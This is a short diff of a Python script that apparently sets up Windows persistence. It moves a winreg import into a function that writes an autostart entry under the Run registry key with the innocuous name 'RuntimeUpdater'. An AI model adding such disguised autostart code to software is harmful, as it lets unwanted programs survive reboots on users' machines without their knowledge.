@@ -1,7 +1,8 @@
 import shutil
 import platform
 import os
-import winreg as reg
+
+# TODO: Make more custom and advanced
 
 def run(name):
     user = os.getlogin()
@@ -19,6 +20,7 @@ def run(name):
     def create_run_key(script_path, python_path=None):
         if platform.system() != "Windows":
             return
+        import winreg as reg
 
         key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
         program_name = "RuntimeUpdater"
